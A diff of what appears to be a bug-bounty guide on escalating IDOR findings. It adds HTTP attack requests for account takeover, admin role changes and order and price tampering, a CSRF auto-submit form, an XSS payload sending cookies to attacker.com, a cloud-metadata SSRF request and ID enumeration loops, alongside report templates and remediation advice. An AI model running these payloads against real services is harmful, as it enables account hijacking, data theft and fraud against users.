@@ -1,118 +1,333 @@
 # IDOR Escalation
 
-## Impact Levels
+You have IDOR. Now maximize the impact for your report.
 
-| Access | Impact | Severity |
-|--------|--------|----------|
-| Read other's data | Info disclosure | Medium-High |
-| Modify other's data | Data tampering | High |
-| Delete other's data | DoS/Data loss | High |
-| Account takeover | Full compromise | Critical |
-| Access admin functions | Privilege escalation | Critical |
+---
+
+## Impact Hierarchy
+
+From lowest to highest severity:
+
+1. **Read non-sensitive data** → Low
+2. **Read PII (email, phone)** → Medium
+3. **Read sensitive data (SSN, financial)** → High
+4. **Modify other users' data** → High
+5. **Delete other users' data** → High
+6. **Account takeover** → Critical
+7. **Admin access** → Critical
+8. **Financial manipulation** → Critical
+
+Your goal: climb this ladder.
+
+---
 
 ## Escalation Chains
 
 ### IDOR → Account Takeover
 
-```
-1. Find IDOR on /api/users/{id}/settings
-2. Change victim's email to yours
-3. Trigger password reset
-4. Own the account
-```
+**Email Change + Password Reset:**
+```http
+# Step 1: Change victim's email
+PUT /api/users/VICTIM_ID
+Authorization: Bearer attacker_token
+{"email": "attacker@evil.com"}
 
-### IDOR → Financial Fraud
+# Step 2: Trigger password reset
+POST /api/password-reset
+{"email": "attacker@evil.com"}
 
-```
-1. Access /api/invoices/{id}
-2. Find payment method IDs
-3. Modify payment destination
-4. Redirect funds
-```
-
-### IDOR → Full Database Dump
-
-```python
-# If sequential IDs, dump everything
-for i in range(1, 1000000):
-    data = get_user(i)
-    if data:
-        save_to_file(data)
+# Step 3: Reset goes to your email
+# Full ATO achieved
 ```
 
-## Maximizing Impact
-
-### 1. Enumerate Everything
-
-Don't stop at one ID - show the scale:
-
-```bash
-# Count accessible records
-total=0
-for id in $(seq 1 10000); do
-  if curl -s "https://target/api/users/$id" | grep -q "email"; then
-    ((total++))
-  fi
-done
-echo "Exposed users: $total"
+**Direct Password Change:**
+```http
+PUT /api/users/VICTIM_ID/password
+Authorization: Bearer attacker_token
+{"new_password": "pwned123"}
 ```
 
-### 2. Find Sensitive Data
+**Disable 2FA:**
+```http
+PUT /api/users/VICTIM_ID/security
+Authorization: Bearer attacker_token
+{"two_factor": false}
+```
 
-Prioritize endpoints with:
-- PII (emails, phones, addresses)
-- Financial data (cards, bank accounts)
-- Credentials (API keys, tokens)
-- Health/legal data (HIPAA, GDPR)
+### IDOR → Admin Access
 
-### 3. Demonstrate Actions
+**Role Manipulation:**
+```http
+PUT /api/users/YOUR_ID
+Authorization: Bearer your_token
+{"role": "admin"}
+
+# Or via admin endpoint
+POST /api/admin/promote
+{"user_id": YOUR_ID, "role": "admin"}
+```
+
+**Admin Function Access:**
+```http
+# Access admin endpoints with admin user's ID
+GET /api/admin/users
+X-Admin-Id: ADMIN_USER_ID
+```
+
+### Read → Write Escalation
+
+Found read-only IDOR? Try:
 
 ```http
-# Read → show data
-# Write → change something recoverable
-# Delete → use test account only
+# If GET works...
+GET /api/users/VICTIM_ID → 200
 
-# Always: Screenshot before/after
+# Try PUT/PATCH/DELETE
+PUT /api/users/VICTIM_ID
+{"email": "test@test.com"}
+
+DELETE /api/users/VICTIM_ID
 ```
 
-## Report Writing Tips
+### Single → Mass Exploitation
 
-### Show Scale
-> "This vulnerability affects all 50,000 users in the database."
+**Demonstrate scale without mass-exploiting:**
 
-### Show Sensitivity
-> "Exposed data includes: full names, email addresses, phone numbers, and hashed passwords."
+```bash
+# Count total users (if endpoint allows)
+GET /api/users?limit=1
+# Response: {"total": 2500000, "data": [...]}
 
-### Show Chain
-> "By chaining this IDOR with the password reset flow, an attacker can take over any account."
+# Or enumerate range
+for id in 1 10 100 1000 10000; do
+  curl -s "https://target.com/api/users/$id" | jq -r '.id' 
+done
+# If all return data, extrapolate to full database
+```
 
-### CVSS Considerations
+---
 
-- **Confidentiality**: What data is exposed?
-- **Integrity**: Can data be modified?
-- **Availability**: Can data be deleted?
-- **Scope**: Does it affect other components?
+## Chaining with Other Vulns
+
+### IDOR + CSRF
+
+If IDOR requires POST and there's no CSRF protection:
+
+```html
+<form id="f" action="https://target.com/api/users/VICTIM_ID" method="POST">
+  <input name="email" value="attacker@evil.com">
+</form>
+<script>document.getElementById('f').submit();</script>
+```
+
+### IDOR + XSS
+
+Store XSS payload via IDOR:
+
+```http
+PUT /api/users/VICTIM_ID/profile
+{"bio": "<script>document.location='https://attacker.com/?c='+document.cookie</script>"}
+```
+
+When victim views their own profile, XSS fires.
+
+### IDOR + SSRF
+
+If IDOR allows setting webhook URLs:
+
+```http
+PUT /api/users/VICTIM_ID/settings
+{"webhook_url": "http://169.254.169.254/latest/meta-data/"}
+```
+
+---
+
+## Financial Impact
+
+### Order Manipulation
+
+```http
+# Access other users' orders
+GET /api/orders/VICTIM_ORDER_ID
+
+# Modify order contents
+PUT /api/orders/VICTIM_ORDER_ID
+{"items": [...], "price": 0.01}
+
+# Cancel/refund orders
+POST /api/orders/VICTIM_ORDER_ID/refund
+```
+
+### Payment Method Access
+
+```http
+GET /api/users/VICTIM_ID/payment-methods
+# Returns card numbers, bank accounts, etc.
+```
+
+### Transaction History
+
+```http
+GET /api/users/VICTIM_ID/transactions
+# Full financial history exposure
+```
+
+---
+
+## Data Sensitivity
+
+### Sensitive Data Types
+
+| Data Type | Impact |
+|-----------|--------|
+| Email, phone | Medium |
+| Full name, address | Medium-High |
+| SSN, government ID | Critical |
+| Credit card numbers | Critical |
+| Bank account details | Critical |
+| Medical records | Critical |
+| Authentication tokens | Critical |
+| Private messages | High |
+
+### PII Aggregation
+
+Even "low-severity" data becomes critical when combined:
+
+```
+Email + Phone + Address + DOB = Identity theft
+```
+
+Document the full data exposed, not just "user profile."
+
+---
 
 ## Real-World Examples
 
-### Facebook (2019)
-- IDOR exposed phone numbers of 419M users
-- Impact: Mass data scraping
+### McHire/Paradox (64M records)
 
-### Bumble (2020)
-- API IDOR leaked user data globally
-- Impact: 95M accounts exposed
-
-### Instagram (2019)
-- IDOR in business accounts
-- Impact: Contact info of millions
-
-## Prevention Notes
-
-For report recommendations:
+```http
+PUT /api/lead/cem-xhr
+{"lead_id": 64185741}  # Sequential, no auth check
+# Leaked: name, email, phone, address, JWT tokens
 ```
-1. Implement object-level authorization
-2. Use unpredictable identifiers (UUIDs)
-3. Validate ownership on every request
-4. Log and monitor access patterns
+
+Impact: Full PII + JWT tokens for 64 million users.
+
+### CrowdSignal IDOR → ATO
+
+```http
+GET /users/invite-user.php?id=19920465
+# Change ID → See/edit any user → Update Permissions → ATO
 ```
+
+Impact: Complete account takeover of any user.
+
+### DoD Medical Records
+
+```http
+GET /viewMedicalRecord?recordId=VICTIM_ID
+→ 302 Redirect (but PDF data in response body!)
+```
+
+Impact: Medical records exposed despite "redirect" response.
+
+---
+
+## Impact Documentation
+
+### Calculate Scale
+
+```markdown
+## Affected Users
+- Total users in database: ~2,500,000
+- Tested IDs 1-100: 98 returned valid data
+- Extrapolated exposure: ~2,450,000 users
+```
+
+### Categorize Data Exposure
+
+```markdown
+## Data Exposed Per User
+- Email address
+- Phone number  
+- Full name
+- Physical address
+- Date of birth
+- Profile photo
+- Account creation date
+- Last login timestamp
+```
+
+### Risk Assessment
+
+```markdown
+## Risk Analysis
+- **Confidentiality**: Critical - PII of all users exposed
+- **Integrity**: High - Attacker can modify user data
+- **Availability**: Medium - Attacker can delete resources
+- **Compliance**: GDPR, CCPA, HIPAA violations
+```
+
+---
+
+## Impact Statements
+
+| Scenario | Impact Statement |
+|----------|------------------|
+| Read PII | "Attacker can access personal data (email, phone, address) of all 2.5M users in the database" |
+| ATO via email change | "Attacker can take over any user account by changing email and resetting password" |
+| Admin access | "Attacker can escalate to admin role, gaining full control of the platform" |
+| Financial | "Attacker can access payment methods and transaction history of all users" |
+| Mass deletion | "Attacker can delete resources for any user, causing permanent data loss" |
+
+---
+
+## PoC Template
+
+```markdown
+## Summary
+IDOR in [endpoint] allows [action] on any user's [resource].
+
+## Severity
+Critical / High / Medium
+
+## Steps to Reproduce
+1. Create two accounts (attacker: user_id=123, victim: user_id=124)
+2. Login as attacker
+3. Navigate to [endpoint] and capture request
+4. Change [parameter] from 123 to 124
+5. Observe: victim's data is [returned/modified/deleted]
+
+## Affected Data
+- User email
+- User phone
+- [Other sensitive fields]
+
+## Impact
+- Affects all [NUMBER] users in database
+- Attacker can [read/modify/delete] any user's [resource]
+- [Specific business impact]
+
+## Proof of Concept
+[Screenshot showing different user's data]
+[Redact actual PII]
+
+## Remediation
+Implement proper authorization checks on [endpoint]:
+- Verify requesting user owns the resource
+- Use session-based user identification, not client-supplied IDs
+```
+
+---
+
+## Checklist Before Reporting
+
+- [ ] Confirmed IDOR with two accounts
+- [ ] Documented read/write/delete capabilities
+- [ ] Estimated scale (total affected users)
+- [ ] Listed all exposed data fields
+- [ ] Checked for ATO escalation paths
+- [ ] Tested admin function access
+- [ ] Screenshots with PII redacted
+- [ ] Clear reproduction steps
+- [ ] Impact statement based on actual exposure
